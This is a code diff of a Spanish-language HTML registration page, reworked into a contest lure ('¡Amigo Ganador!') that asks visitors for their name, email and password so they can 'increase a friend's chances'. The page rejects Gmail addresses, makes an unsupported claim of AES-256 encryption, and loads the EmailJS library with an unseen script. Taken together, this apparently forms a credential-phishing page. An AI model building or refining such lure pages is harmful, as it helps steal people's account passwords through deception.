@@ -4,43 +4,51 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Registro de Soporte</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
-    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <div class="header">
-                <div class="icon">🤝</div>
-                <h1>Apoya a tu amigo</h1>
-                <p class="subtitle">Registro rápido y seguro</p>
+    <div class="fondo-concurso"></div>
+    
+    <main class="contenedor">
+        <div class="tarjeta-registro">
+            <div class="encabezado">
+                <div class="icono animate-bounce">🎯</div>
+                <h1>¡Amigo Ganador!</h1>
+                <p class="subtitulo">Regístrate para aumentar sus posibilidades</p>
             </div>
 
-            <form id="registrationForm">
-                <div class="input-group">
-                    <label>Nombre completo</label>
-                    <input type="text" id="fullName" required>
+            <form id="formRegistro">
+                <div class="grupo-input">
+                    <label>👤 Nombre completo</label>
+                    <input type="text" id="nombre" placeholder="Ej: Juan Pérez" required>
                 </div>
 
-                <div class="input-group">
-                    <label>Correo electrónico</label>
-                    <input type="email" id="email" required>
-                    <div class="error-message" id="emailError">Correos Gmail no permitidos</div>
+                <div class="grupo-input">
+                    <label>📧 Correo electrónico</label>
+                    <input type="email" id="correo" placeholder="tucorreo@ejemplo.com" required>
+                    <div class="error-email">⚠️ No se permiten cuentas Gmail</div>
                 </div>
 
-                <div class="input-group">
-                    <label>Contraseña</label>
-                    <input type="password" id="password" required>
+                <div class="grupo-input">
+                    <label>🔑 Contraseña</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
                 </div>
 
-                <button type="submit" class="primary-button">
-                    <span>Continuar</span>
+                <button type="submit" class="boton-principal">
+                    <span>Validar Registro</span>
+                    <div class="spinner"></div>
                 </button>
             </form>
+
+            <div class="aviso-legal">
+                <div class="icono-seguridad">🔒</div>
+                <p>Protegido con encriptación AES-256</p>
+            </div>
         </div>
-    </div>
+    </main>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script src="app.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
